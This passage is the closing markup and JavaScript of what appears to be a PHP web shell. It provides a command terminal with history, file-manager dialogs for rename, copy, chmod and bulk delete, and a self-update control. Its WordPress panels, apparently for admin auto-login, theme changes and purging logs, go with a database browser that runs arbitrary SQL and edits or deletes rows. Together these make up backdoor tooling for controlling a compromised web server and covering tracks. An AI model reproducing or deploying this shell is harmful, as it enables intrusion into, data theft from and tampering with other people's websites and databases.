                        <button type="submit" class="btn btn-sm btn-primary" style="font-size:11px;padding:3px 10px;">⬇️ Update Now</button>
                    </form>
                <?php else: ?>
                    <span style="color:#8b949e;font-size:12px;">✔ Up to date (<?= htmlspecialchars($updateResult['remote_version'] ?? SHELL_VERSION) ?>)</span>
                <?php endif; ?>
            <?php endif; ?>
            <?php if ($action === 'doupdate' && $updateResult !== null): ?>
                <span style="color:<?= $updateResult['success'] ? '#7ee787' : '#f85149' ?>;font-size:12px;">
                    <?= $updateResult['success'] ? '✔' : '✘' ?> <?= htmlspecialchars($updateResult['message']) ?>
                </span>
            <?php endif; ?>
        </div>
    </div>

    <!-- ========== MODALS ========== -->

    <!-- Rename Modal -->
    <div class="modal-overlay" id="renameModal">
        <div class="modal">
            <button class="modal-close" onclick="closeModal('renameModal')">✕</button>
            <h3>🔄 Rename</h3>
            <form method="post">
                <input type="hidden" name="action" value="rename">
                <input type="hidden" name="oldpath" id="renameOldPath">
                <input type="text" name="newname" id="renameNewName" placeholder="New name" autocomplete="off">
                <div class="btn-row">
                    <button type="button" class="btn btn-sm" onclick="closeModal('renameModal')">Cancel</button>
                    <button type="submit" class="btn btn-sm btn-primary">Rename</button>
                </div>
            </form>
        </div>
    </div>

    <!-- New Directory Modal -->
    <div class="modal-overlay" id="mkdirModal">
        <div class="modal">
            <button class="modal-close" onclick="closeModal('mkdirModal')">✕</button>
            <h3>📁 Create Directory</h3>
            <form method="post">
                <input type="hidden" name="action" value="mkdir">
                <input type="text" name="dirname" placeholder="Directory name" autocomplete="off" autofocus>
                <div class="btn-row">
                    <button type="button" class="btn btn-sm" onclick="closeModal('mkdirModal')">Cancel</button>
                    <button type="submit" class="btn btn-sm btn-primary">Create</button>
                </div>
            </form>
        </div>
    </div>

    <!-- New File Modal -->
    <div class="modal-overlay" id="newfileModal">
        <div class="modal">
            <button class="modal-close" onclick="closeModal('newfileModal')">✕</button>
            <h3>📄 Create New File</h3>
            <form method="post">
                <input type="hidden" name="action" value="newfile">
                <input type="text" name="filename" placeholder="filename.txt" autocomplete="off" autofocus>
                <div class="btn-row">
                    <button type="button" class="btn btn-sm" onclick="closeModal('newfileModal')">Cancel</button>
                    <button type="submit" class="btn btn-sm btn-primary">Create</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Copy Modal -->
    <div class="modal-overlay" id="copyModal">
        <div class="modal">
            <button class="modal-close" onclick="closeModal('copyModal')">✕</button>
            <h3>📋 Copy File</h3>
            <form method="post">
                <input type="hidden" name="action" value="copy">
                <input type="hidden" name="srcpath" id="copySrcPath">
                <input type="text" name="copyname" id="copySrcName" placeholder="New filename" autocomplete="off">
                <div class="btn-row">
                    <button type="button" class="btn btn-sm" onclick="closeModal('copyModal')">Cancel</button>
                    <button type="submit" class="btn btn-sm btn-primary">Copy</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Chmod Modal -->
    <div class="modal-overlay" id="chmodModal">
        <div class="modal">
            <button class="modal-close" onclick="closeModal('chmodModal')">✕</button>
            <h3>🔑 Change Permissions (chmod)</h3>
            <form method="post">
                <input type="hidden" name="action" value="chmod">
                <input type="hidden" name="chmodpath" id="chmodPath">
                <input type="text" name="chmodval" id="chmodVal" placeholder="e.g. 755 or 644" maxlength="4"
                    autocomplete="off" pattern="[0-7]{3,4}">
                <div style="font-size:11px;color:#6e7681;margin-bottom:8px;">Current: <span id="chmodCurrent"></span>
                </div>
                <div class="btn-row">
                    <button type="button" class="btn btn-sm" onclick="closeModal('chmodModal')">Cancel</button>
                    <button type="submit" class="btn btn-sm btn-primary">Apply</button>
                </div>
            </form>
        </div>
    </div>

    <!-- Search Modal -->
    <div class="modal-overlay" id="searchModal">
        <div class="modal">
            <button class="modal-close" onclick="closeModal('searchModal')">✕</button>
            <h3>🔍 Search in <?= htmlspecialchars(basename($currentDir)) ?>/</h3>
            <form method="post">
                <input type="hidden" name="action" value="search">
                <input type="text" name="keyword" placeholder="Filename keyword..." autocomplete="off" autofocus>
                <div class="btn-row">
                    <button type="button" class="btn btn-sm" onclick="closeModal('searchModal')">Cancel</button>
                    <button type="submit" class="btn btn-sm btn-primary">Search</button>
                </div>
            </form>
        </div>
    </div>

    <script>
        // --- Terminal functions ---
        function fillCmd(v) { if (v) { var i = document.getElementById('cmdInput'); i.value = v; i.focus(); } }
        function clearHist() {
            fetch('?', { method: 'POST', headers: { 'Content-Type': 'application/x-www-form-urlencoded' }, body: 'action=clear_history' })
                .then(() => location.reload());
        }
        window.onload = function () {
            document.getElementById('cmdInput').focus();
            var o = document.getElementById('outputArea');
            if (o) o.scrollTop = o.scrollHeight;
        };
        document.addEventListener('keydown', function (e) {
            if (e.ctrlKey && e.key === 'l') { e.preventDefault(); document.getElementById('cmdInput').focus(); }
            if (e.key === 'Escape') { document.querySelectorAll('.modal-overlay.show').forEach(m => m.classList.remove('show')); }
        });

        // --- Modal functions ---
        function openModal(id) { document.getElementById(id).classList.add('show'); setTimeout(() => { var f = document.querySelector('#' + id + ' input[type=text]'); if (f) f.focus(); }, 50); }
        function closeModal(id) { document.getElementById(id).classList.remove('show'); }

        // --- Action handlers via data attributes (safe from special characters) ---
        document.addEventListener('click', function(e) {
            // Rename button
            if (e.target.classList.contains('rename-btn')) {
                var path = e.target.getAttribute('data-path');
                var name = e.target.getAttribute('data-name');
                if (path) openRenameModal(path, name);
            }
            // Copy button
            if (e.target.classList.contains('copy-btn')) {
                var path = e.target.getAttribute('data-path');
                var name = e.target.getAttribute('data-name');
                if (path) openCopyModal(path, name);
            }
            // Chmod button
            if (e.target.classList.contains('chmod-btn')) {
                var path = e.target.getAttribute('data-path');
                var perms = e.target.getAttribute('data-perms');
                if (path) openChmodModal(path, perms);
            }
            // Dir size button
            if (e.target.classList.contains('dirsize-btn')) {
                var path = e.target.getAttribute('data-path');
                var labelId = e.target.getAttribute('data-labelid');
                if (path && labelId) getDirSize(path, labelId);
            }
        });

        function openRenameModal(path, name) {
            document.getElementById('renameOldPath').value = path;
            document.getElementById('renameNewName').value = name;
            openModal('renameModal');
            setTimeout(() => { document.getElementById('renameNewName').select(); }, 60);
        }

        function openCopyModal(path, name) {
            document.getElementById('copySrcPath').value = path;
            document.getElementById('copySrcName').value = 'copy_' + name;
            openModal('copyModal');
            setTimeout(() => { document.getElementById('copySrcName').select(); }, 60);
        }

        function openChmodModal(path, currentPerm) {
            document.getElementById('chmodPath').value = path;
            document.getElementById('chmodVal').value = currentPerm;
            document.getElementById('chmodCurrent').textContent = currentPerm;
            openModal('chmodModal');
            setTimeout(() => { document.getElementById('chmodVal').select(); }, 60);
        }

        // --- Dir Size (AJAX) ---
        function getDirSize(path, labelId) {
            var el = document.getElementById(labelId);
            if (!el) return;
            el.textContent = '...';
            fetch('?action=dirsize&dir=' + encodeURIComponent(path))
                .then(r => r.json())
                .then(d => {
                    if (d.error) el.textContent = '[err]';
                    else el.textContent = '(' + d.size + ')';
                })
                .catch(() => { el.textContent = '[err]'; });
        }

        // Close modal when clicking outside
        document.querySelectorAll('.modal-overlay').forEach(overlay => {
            overlay.addEventListener('click', function (e) { if (e.target === this) this.classList.remove('show'); });
        });

        // Bulk Delete logic
        let selectAllState = false;
        function toggleSelectAll() {
            selectAllState = !selectAllState;
            document.querySelectorAll('.bulk-cb').forEach(cb => cb.checked = selectAllState);
        }
        function submitBulkDelete() {
            const checked = document.querySelectorAll('.bulk-cb:checked');
            if (checked.length === 0) { alert('No files selected.'); return; }
            if (confirm('Delete ' + checked.length + ' selected item(s)?')) {
                document.getElementById('bulkForm').submit();
            }
        }

        // ── Panel toggle (show/hide) ──────────────────────────────────────
        function togglePanel(bodyId, btnId) {
            const body = document.getElementById(bodyId);
            const btn  = document.getElementById(btnId);
            if (!body || !btn) return;
            const open = body.classList.toggle('open');
            btn.textContent = open ? '▼ hide' : '▶ show';
        }
        <?php if ($wpAutoLog !== null): ?>
        (function(){ const b=document.getElementById('wpAdminPanel'),t=document.getElementById('wpAdminToggle'); if(b&&t){b.classList.add('open');t.textContent='▼ hide';} })();
        <?php endif; ?>
        <?php if ($wpThemeLog !== null): ?>
        (function(){ const b=document.getElementById('wpThemePanel'),t=document.getElementById('wpThemeToggle'); if(b&&t){b.classList.add('open');t.textContent='▼ hide';} })();
        <?php endif; ?>
        <?php if ($wpPurgeLog !== null): ?>
        (function(){ const b=document.getElementById('wpThemePanel'),t=document.getElementById('wpThemeToggle'); if(b&&t){b.classList.add('open');t.textContent='▼ hide';} })();
        <?php endif; ?>

        // ── phpMyAdmin JS ─────────────────────────────────────────────────
        const PMA_URL = '?';
        let pmaCurrentDb    = <?= json_encode($mysqlConn['db'] ?? '') ?>;
        let pmaCurrentTable = '';
        let pmaCurrentPage  = 0;
        let pmaTotalRows    = 0;
        let pmaPageLimit    = 50;
        let pmaCols         = [];
        let pmaPkCol        = '';

        function pmaEsc(s) {
            return String(s==null?'':s).replace(/&/g,'&amp;').replace(/</g,'&lt;').replace(/>/g,'&gt;').replace(/"/g,'&quot;');
        }

        function pmaPost(data) {
            const fd = new FormData();
            fd.append('action', 'pma_ajax');
            for (const [k,v] of Object.entries(data)) fd.append(k, v);
            return fetch(PMA_URL, {method:'POST', body:fd}).then(r => r.json());
        }

        function pmaSetContent(h) {
            const el = document.getElementById('pmaContent');
            if (el) el.innerHTML = h;
        }

        function hidePagination() {
            const el = document.getElementById('pmaPagination');
            if (el) el.style.display = 'none';
        }

        function showPagination(page, total, limit) {
            const el = document.getElementById('pmaPagination');
            if (!el) return;
            el.style.display = 'flex';
            document.getElementById('pmaPageInfo').textContent = 'Page '+(page+1)+' / '+Math.max(1,Math.ceil(total/limit));
            document.getElementById('pmaTotalInfo').textContent = total+' rows';
            document.getElementById('btnPrev').disabled = page === 0;
            document.getElementById('btnNext').disabled = (page+1)*limit >= total;
        }

        function setBreadcrumb(db, tbl) {
            const el = document.getElementById('pmaBreadcrumb');
            if (!el) return;
            el.innerHTML = '<span style="color:#f0883e;">'+pmaEsc(db)+'</span>'
                + (tbl ? '<span style="color:#6e7681;"> / </span><span style="color:#7ee787;">'+pmaEsc(tbl)+'</span>' : '');
        }

        function pmaListDbs() {
            const dbList = document.getElementById('pmaDbList');
            if (!dbList) return;
            dbList.innerHTML = '<div style="padding:8px;font-size:11px;color:#6e7681;">Loading...</div>';
            pmaPost({sub:'list_dbs'}).then(d => {
                if (d.error) { dbList.innerHTML = '<div style="padding:8px;font-size:11px;color:#f85149;">'+pmaEsc(d.error)+'</div>'; return; }
                let h = '';
                d.dbs.forEach(db => {
                    // Use data-db attribute — avoids any quoting issues with JSON.stringify in innerHTML
                    h += '<div class="pma-item db-item'+(db===pmaCurrentDb?' active':'')+'" data-db="'+pmaEsc(db)+'" title="'+pmaEsc(db)+'">🗄 '+pmaEsc(db)+'</div>';
                });
                dbList.innerHTML = h;
                // Attach click listeners via event delegation (already handled below)
                if (pmaCurrentDb) pmaSelectDb(pmaCurrentDb);
            }).catch(e => { dbList.innerHTML = '<div style="padding:8px;font-size:11px;color:#f85149;">'+String(e)+'</div>'; });
        }

        // Event delegation for sidebar clicks — avoids all inline onclick issues
        document.addEventListener('click', function(e) {
            const dbEl = e.target.closest('.pma-item.db-item[data-db]');
            if (dbEl) { pmaSelectDb(dbEl.getAttribute('data-db')); return; }
            const tblEl = e.target.closest('.pma-item.tbl-item[data-tbl]');
            if (tblEl) { pmaBrowseTable(tblEl.getAttribute('data-tbl')); return; }
        });

        function pmaSelectDb(db) {
            pmaCurrentDb = db;
            pmaCurrentTable = '';
            pmaPost({sub:'select_db', db}).then(d => {
                if (d.error) { pmaSetContent('<div style="color:#f85149;padding:10px;">'+pmaEsc(d.error)+'</div>'); return; }
                // Rebuild entire sidebar list: dbs + tables for selected db, all inside the ONE scroll container
                const dbList = document.getElementById('pmaDbList');
                // Re-request db list to keep it current, then inject tables below selected db
                pmaPost({sub:'list_dbs'}).then(dbsData => {
                    let h = '';
                    (dbsData.dbs || []).forEach(dbName => {
                        h += '<div class="pma-item db-item'+(dbName===db?' active':'')+'" data-db="'+pmaEsc(dbName)+'" title="'+pmaEsc(dbName)+'">🗄 '+pmaEsc(dbName)+'</div>';
                        if (dbName === db && d.tables && d.tables.length) {
                            // Inject tables right below the selected db
                            h += '<div class="pma-tbl-section-hdr">📋 '+pmaEsc(db)+' ('+d.tables.length+')</div>';
                            d.tables.forEach(t => {
                                h += '<div class="pma-item tbl-item'+(t===pmaCurrentTable?' active':'')+'" data-tbl="'+pmaEsc(t)+'" title="'+pmaEsc(t)+'" style="padding-left:20px;">▸ '+pmaEsc(t)+'</div>';
                            });
                        }
                    });
                    dbList.innerHTML = h;
                    // Scroll selected db into view
                    const activeEl = dbList.querySelector('.pma-item.db-item.active');
                    if (activeEl) activeEl.scrollIntoView({block:'nearest'});
                });
                setBreadcrumb(db, '');
                pmaSetContent('<div style="color:#8b949e;font-size:12px;padding:16px;"><strong style="color:#f0883e;">'+pmaEsc(db)+'</strong> — '+d.tables.length+' table(s). Click a table on the left.</div>');
                hidePagination();
                document.getElementById('btnInsert').style.display = 'none';
                document.getElementById('btnRefresh').style.display = 'none';
            });
        }

        function pmaBrowseTable(tbl, page) {
            pmaCurrentTable = tbl;
            pmaCurrentPage  = (page !== undefined) ? page : 0;
            // Highlight active table in sidebar
            document.querySelectorAll('.pma-item.tbl-item').forEach(el => {
                el.classList.toggle('active', el.getAttribute('data-tbl') === tbl);
            });
            document.getElementById('btnInsert').style.display = 'inline-block';
            document.getElementById('btnRefresh').style.display = 'inline-block';
            pmaSetContent('<div style="color:#8b949e;font-size:12px;padding:10px;">Loading <strong>'+pmaEsc(tbl)+'</strong>...</div>');
            pmaPost({sub:'browse', table:tbl, db:pmaCurrentDb, page:pmaCurrentPage}).then(d => {
                if (d.error) { pmaSetContent('<div style="color:#f85149;padding:10px;">'+pmaEsc(d.error)+'</div>'); return; }
                pmaCols    = d.cols;
                pmaTotalRows = d.total;
                pmaPageLimit = d.limit;
                pmaPkCol = '';
                pmaCols.forEach(c => { if (c.Key==='PRI' && !pmaPkCol) pmaPkCol = c.Field; });
                if (!pmaPkCol && pmaCols.length) pmaPkCol = pmaCols[0].Field;
                setBreadcrumb(pmaCurrentDb, tbl);
                renderBrowseTable(d.rows, d.cols);
                showPagination(d.page, d.total, d.limit);
            });
        }

        function pmaRefreshTable() { if (pmaCurrentTable) pmaBrowseTable(pmaCurrentTable, pmaCurrentPage); }

        function renderBrowseTable(rows, cols) {
            if (!rows.length) {
                pmaSetContent('<div style="color:#8b949e;font-size:12px;padding:10px;">Table is empty.</div>');
                return;
            }
            let h = '<div class="pma-table-wrap"><table class="pma-table"><thead><tr>'
                  + '<th style="width:72px;min-width:72px;">Act</th>';
            cols.forEach(c => h += '<th>'+pmaEsc(c.Field)+'<br><span style="font-weight:normal;color:#6e7681;font-size:10px;">'+pmaEsc(c.Type)+'</span></th>');
            h += '</tr></thead><tbody>';
            rows.forEach((row, ri) => {
                const pkv = String(row[pmaPkCol] ?? '');
                // Use data-ri and data-pkv — no inline JS expression
                h += '<tr><td class="act-col">'
                   + '<button class="btn btn-sm pma-edit-btn" data-ri="'+ri+'" style="font-size:10px;padding:1px 5px;margin-right:2px;">✏</button>'
                   + '<button class="btn btn-sm btn-danger pma-del-btn" data-pkv="'+pmaEsc(pkv)+'" style="font-size:10px;padding:1px 5px;">✕</button>'
                   + '</td>';
                cols.forEach(c => {
                    const v = row[c.Field];
                    h += '<td title="'+pmaEsc(String(v??''))+'"><span class="'+(v===null?'null-val':'')+'">'+(v===null?'NULL':pmaEsc(String(v)))+'</span></td>';
                });
                h += '</tr>';
            });
            h += '</tbody></table></div>';
            window._pmaRows = rows;
            pmaSetContent(h);
        }

        // Delegated clicks for edit/delete buttons inside pmaContent
        document.addEventListener('click', function(e) {
            const editBtn = e.target.closest('.pma-edit-btn[data-ri]');
            if (editBtn) { pmaEditRow(parseInt(editBtn.getAttribute('data-ri'), 10)); return; }
            const delBtn = e.target.closest('.pma-del-btn[data-pkv]');
            if (delBtn) { pmaDeleteRow(delBtn.getAttribute('data-pkv')); return; }
        });

        function pmaDeleteRow(pkv) {
            if (!confirm('Delete row where '+pmaPkCol+' = '+pkv+'?')) return;
            pmaPost({sub:'delete_row', table:pmaCurrentTable, db:pmaCurrentDb, pk:pmaPkCol, pkv})
                .then(d => { if (d.error) alert('Error: '+d.error); else pmaRefreshTable(); });
        }

        function pmaEditRow(ri) {
            const row = (window._pmaRows||[])[ri];
            if (!row) return;
            const pkv = row[pmaPkCol] ?? '';
            let h = '<div style="padding:12px;">'
                  + '<h4 style="margin:0 0 10px;color:#58a6ff;">✏ Edit Row — '+pmaEsc(pmaCurrentTable)+'</h4>'
                  + '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:8px;">';
            pmaCols.forEach(c => {
                const v = row[c.Field] ?? '';
                h += '<div><label style="font-size:11px;color:#8b949e;display:block;margin-bottom:2px;">'
                   + pmaEsc(c.Field)+(c.Key==='PRI'?' <span style="color:#f0883e;">[PK]</span>':'')+'</label>'
                   + '<input id="pmaef_'+pmaEsc(c.Field)+'" value="'+pmaEsc(String(v))+'" '
                   + 'style="width:100%;box-sizing:border-box;background:#0a0c10;border:1px solid #30363d;color:#e6edf3;padding:5px 8px;border-radius:4px;font-size:12px;"></div>';
            });
            h += '</div><div style="margin-top:12px;display:flex;gap:8px;">'
               + '<button class="btn btn-sm btn-primary" onclick="pmaSubmitEdit('+JSON.stringify(String(pkv))+')">💾 Save</button>'
               + '<button class="btn btn-sm" onclick="pmaRefreshTable()">✕ Cancel</button></div></div>';
            pmaSetContent(h);
            hidePagination();
        }

        function pmaSubmitEdit(pkv) {
            const fd = new FormData();
            fd.append('action','pma_ajax'); fd.append('sub','update_row');
            fd.append('table',pmaCurrentTable); fd.append('db',pmaCurrentDb);
            fd.append('pk',pmaPkCol); fd.append('pkv',pkv);
            pmaCols.forEach(c => {
                const el = document.getElementById('pmaef_'+c.Field);
                if (el) fd.append('fields['+c.Field+']', el.value);
            });
            fetch(PMA_URL,{method:'POST',body:fd}).then(r=>r.json()).then(d => {
                if (d.error) alert('Error: '+d.error); else pmaRefreshTable();
            });
        }

        function pmaShowInsert() {
            let h = '<div style="padding:12px;">'
                  + '<h4 style="margin:0 0 10px;color:#7ee787;">+ Insert Row — '+pmaEsc(pmaCurrentTable)+'</h4>'
                  + '<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:8px;">';
            pmaCols.forEach(c => {
                const isAuto = c.Extra === 'auto_increment';
                h += '<div><label style="font-size:11px;color:#8b949e;display:block;margin-bottom:2px;">'
                   + pmaEsc(c.Field)+(isAuto?' <span style="color:#6e7681;">[auto]</span>':'')+'</label>'
                   + '<input id="pmaif_'+pmaEsc(c.Field)+'" placeholder="'+(isAuto?'auto':'')+'" '
                   + (isAuto?'disabled ':'')
                   + 'style="width:100%;box-sizing:border-box;background:#0a0c10;border:1px solid #30363d;color:#e6edf3;padding:5px 8px;border-radius:4px;font-size:12px;"></div>';
            });
            h += '</div><div style="margin-top:12px;display:flex;gap:8px;">'
               + '<button class="btn btn-sm btn-primary" onclick="pmaSubmitInsert()">➕ Insert</button>'
               + '<button class="btn btn-sm" onclick="pmaRefreshTable()">✕ Cancel</button></div></div>';
            pmaSetContent(h);
            hidePagination();
        }

        function pmaSubmitInsert() {
            const fd = new FormData();
            fd.append('action','pma_ajax'); fd.append('sub','insert_row');
            fd.append('table',pmaCurrentTable); fd.append('db',pmaCurrentDb);
            pmaCols.forEach(c => {
                if (c.Extra === 'auto_increment') return;
                const el = document.getElementById('pmaif_'+c.Field);
                if (el && el.value !== '') fd.append('fields['+c.Field+']', el.value);
            });
            fetch(PMA_URL,{method:'POST',body:fd}).then(r=>r.json()).then(d => {
                if (d.error) alert('Error: '+d.error);
                else { alert('Inserted! New ID: '+(d.id||'N/A')); pmaRefreshTable(); }
            });
        }

        function pmaRunSql() {
            const sql = (document.getElementById('pmaSqlInput')?.value || '').trim();
            if (!sql) return;
            pmaPost({sub:'run_sql', sql, db:pmaCurrentDb}).then(d => {
                if (d.error) { pmaSetContent('<div style="color:#f85149;padding:10px;font-size:12px;">'+pmaEsc(d.error)+'</div>'); return; }
                if (d.ok !== undefined) { pmaSetContent('<div style="color:#7ee787;padding:10px;font-size:12px;">✔ Query OK — '+d.affected+' row(s) affected.</div>'); hidePagination(); return; }
                if (!d.rows || !d.rows.length) { pmaSetContent('<div style="color:#8b949e;font-size:12px;padding:10px;">Empty result.</div>'); return; }
                let h = '<div class="pma-table-wrap"><table class="pma-table"><thead><tr>';
                d.cols.forEach(c => h += '<th>'+pmaEsc(c)+'</th>');
                h += '</tr></thead><tbody>';
                d.rows.forEach(row => {
                    h += '<tr>';
                    d.cols.forEach(c => { const v=row[c]; h+='<td>'+(v===null?'<span class="null-val">NULL</span>':pmaEsc(String(v)))+'</td>'; });
                    h += '</tr>';
                });
                h += '</tbody></table></div><div style="color:#6e7681;font-size:11px;margin-top:4px;padding:0 4px;">'+d.rows.length+' row(s)</div>';
                pmaSetContent(h);
                hidePagination();
            });
        }

        function pmaClearSql() {
            const el = document.getElementById('pmaSqlInput');
            if (el) el.value = '';
        }

        function pmaPrevPage() { if (pmaCurrentPage > 0) pmaBrowseTable(pmaCurrentTable, pmaCurrentPage-1); }
        function pmaNextPage() { if ((pmaCurrentPage+1)*pmaPageLimit < pmaTotalRows) pmaBrowseTable(pmaCurrentTable, pmaCurrentPage+1); }

        // Init PMA on load
        window.addEventListener('load', function() {
            if (document.getElementById('pmaDbList')) pmaListDbs();
        });
    </script>
</body>
</html>